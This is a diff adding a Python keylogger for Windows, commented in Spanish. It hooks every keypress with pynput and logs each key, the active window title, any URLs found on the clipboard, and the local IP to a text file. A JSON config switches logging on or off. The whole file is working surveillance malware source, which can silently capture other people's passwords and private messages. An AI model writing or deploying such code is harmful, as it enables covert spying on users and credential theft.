@@ -1,0 +1,122 @@
+import json
+import time
+from pynput import keyboard
+import pyperclip
+import socket
+import logging
+import win32gui
+
+# Función para obtener la dirección IP local
+def get_local_ip(config_filename='config.json'):
+    try:
+        with open(config_filename, 'r') as file:
+            config = json.load(file)
+            keylogger_IP = config.get('keylogger_IP', False)
+            if keylogger_IP:
+                hostname = socket.gethostname()
+                local_ip = socket.gethostbyname(hostname)
+                return local_ip
+            else:
+                return "Disabled"
+    except:
+        return "Unknown"
+
+# Función para interpretar la URL (debe implementarse según necesidad)
+def parse_url(url):
+    # Aquí puedes implementar la lógica para interpretar la URL
+    return url
+
+# Función para guardar la visita a una URL en el registro
+def log_website_visit(url, config_filename='config.json'):
+    try:
+        with open(config_filename, 'r') as file:
+            config = json.load(file)
+            keylogger_web_visit = config.get('keylogger_web_visit', False)
+            if keylogger_web_visit:
+                time_now = time.strftime("%Y-%m-%d %H:%M:%S")
+                log_data = f'{time_now} - Visited URL: {url}'
+                print(log_data)
+
+                carpeta_guardado = config.get("carpeta_guardado", 'KeyActiveLog.txt')
+                logging.basicConfig(filename=carpeta_guardado, level=logging.DEBUG, format='%(message)s')
+                logging.log(10, log_data)
+            else:
+                print("Website Disabled")
+    except:
+        print("Error while logging website visit")
+
+# Función para obtener el título de la ventana activa
+def get_active_window():
+    try:
+        window = win32gui.GetForegroundWindow()
+        window_title = win32gui.GetWindowText(window)
+        return window_title
+    except:
+        return "Unknown"
+
+# Función que se ejecuta cada vez que se presiona una tecla
+def on_keypress(key, carpeta_guardado):
+    try:
+        window_title = get_active_window()
+        time_now = time.strftime("%Y-%m-%d %H:%M:%S")
+
+        clipboard_content = pyperclip.paste()
+
+        local_ip = get_local_ip()
+
+        if clipboard_content.startswith('http://') or clipboard_content.startswith('https://'):
+            interpreted_url = parse_url(clipboard_content)
+            log_website_visit(interpreted_url)
+            log_data = f'{time_now} - Window: {window_title}, URL: {interpreted_url}, IP: {local_ip}'
+            print(f'{time_now} - Window: {window_title}, URL: {interpreted_url}, IP: {local_ip}')
+        elif 'http://' in window_title or 'https://' in window_title:
+            log_website_visit(window_title)
+            log_data = f'{time_now} - Window: {window_title}, IP: {local_ip}'
+            print(f'{time_now} - Window: {window_title}, IP: {local_ip}')
+        else:
+            key_str = str(key.char) if hasattr(key, 'char') else str(key)
+            log_data = f'{time_now} - Window: {window_title}, Key: {key_str}, IP: {local_ip}'
+            print(f'{time_now} - Window: {window_title}, Key: {key_str}, IP: {local_ip}')
+
+        logging.basicConfig(filename=carpeta_guardado, level=logging.DEBUG, format='%(message)s')
+        logging.log(10, log_data)
+
+    except AttributeError:
+        print(f'{time_now} - Window: {window_title}, Special Key: {key}')
+
+if __name__ == "__main__":
+    # Función para cargar la configuración desde un archivo JSON
+    def load_config(filename):
+        try:
+            with open(filename, 'r') as file:
+                return json.load(file)
+        except FileNotFoundError:
+            with open('config_default.json', 'r') as default_file:
+                return json.load(default_file)
+
+    # Nombre del archivo de configuración
+    config_filename = 'config.json'
+
+    # Cargar la configuración
+    config = load_config(config_filename)
+
+    # Guardar la configuración inicial si el archivo no existe
+    with open(config_filename, 'w') as file:
+        json.dump(config, file, indent=4)
+
+    # Ruta del archivo donde se guardarán los registros del Keylogger     
+    carpeta_guardado = config.get("carpeta_guardado", 'KeyActiveLog.txt')
+    keylogger_active = config.get('keylogger_active', False)
+    
+    # Definir la función on_keyrelease dentro del bloque if __name__ == "__main__":
+    def on_keyrelease(key):
+        if key == keyboard.Key.esc:
+            return False
+
+    # Verificar si keylogger_active está activado en el config.json
+    if keylogger_active:
+        with keyboard.Listener(on_press=lambda key: on_keypress(key, carpeta_guardado), on_release=on_keyrelease) as listener:
+            listener.join()
+    else:
+        print('Se desactivó la función del keylogger en el archivo config.json')
+    
